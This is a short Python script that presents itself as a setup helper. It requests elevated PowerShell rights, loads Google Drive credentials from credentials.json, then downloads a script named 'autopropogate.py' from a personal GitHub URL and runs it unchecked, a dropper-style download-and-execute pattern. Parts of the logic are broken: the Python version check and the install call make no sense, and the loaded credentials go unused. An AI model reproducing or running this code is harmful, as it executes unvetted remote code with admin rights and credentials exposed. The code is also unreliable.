import subprocess
import sys
import urllib.request
import os
import json

def install_and_run_py_script():
    # Install Python 3 (Windows)
    if sys.version_info < (3, 0):
        print('Python 3 not detected. Installing...')
        subprocess.call(['powershell.exe', 'Start-Process', 'python', '-ArgumentList', '/quiet', '-Wait', '-NoNewWindow', '-PassThru', '-Verb', 'runas'])
        print('Python 3 installation complete.')

    # Authenticate with the Google Drive API using JSON source file
    creds = None
    if os.path.exists('credentials.json'):
        with open('credentials.json', 'r') as f:
            creds = json.load(f)
    
    if not creds:
        print('Google Drive API credentials not found. Please download the JSON source file and place it in the current directory.')
        return
    
    from google.oauth2.credentials import Credentials
    creds = Credentials.from_authorized_user_info(info=creds)

    # Download and run the Python script from GitHub
    url = 'https://raw.githubusercontent.com/11josh69/joshsfiles/main/autopropogate.py'
    filename = 'autopropogate.py'

    print(f'Downloading {filename} from {url}...')
    urllib.request.urlretrieve(url, filename)

    print(f'Running {filename}...')
    subprocess.call(['python', filename])
